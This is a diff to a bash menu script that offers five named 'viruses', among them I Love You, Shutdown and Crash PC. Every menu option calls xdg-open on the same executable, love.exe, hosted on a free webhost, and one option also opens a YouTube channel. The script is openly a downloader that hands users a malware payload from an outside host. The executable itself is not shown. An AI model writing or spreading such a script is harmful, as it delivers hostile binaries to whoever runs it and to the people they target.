@@ -23,37 +23,38 @@ display_art() {
 # Display the ASCII art
 display_art
     echo "Menu:"
-    echo "1. Virus 1"
-    echo "2. Virus 2"
-    echo "3. Virus 3"
-	echo "4. Virus 4"
-	echo "5. Virus 5"
+    echo "1. I Love You Virus"
+    echo "2. Notepad Virus"
+    echo "3. Popup Virus"
+	echo "4. Shutdown Virus"
+	echo "5. Crash PC Virus"
     echo "6. Exit"
     read -p "Select an option: " choice
 
     case $choice in
         1)
-            echo "You selected: Virus"
+            echo "You selected:  I Love You Virus"
             # Add code to run the other bash script here
+            xdg-open "https://www.youtube.com/techhacker7"  # Open link in default browser
             xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/love.exe"  # Open link in default browser
             ;;
         2)
-            echo "You selected: Virus"
+            echo "You selected: Notepad Virus"
             # Add code to run the other bash script here
             xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/love.exe"  # Open link in default browser
             ;;
         3)
-            echo "You selected: Virus"
+            echo "You selected: Popup Virus"
             # Add code to run the other bash script here
             xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/love.exe"  # Open link in default browser
             ;;
 	    4)
-            echo "You selected: Virus"
+            echo "You selected: Shutdown Virus"
             # Add code to run the other bash script here
             xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/love.exe"  # Open link in default browser
             ;;
 		5)
-            echo "You selected: Virus"
+            echo "You selected: Crash PC Virus"
             # Add code to run the other bash script here
             xdg-open "https://wdevmail.000webhostapp.com/Bach%20File/love.exe"  # Open link in default browser
             ;;
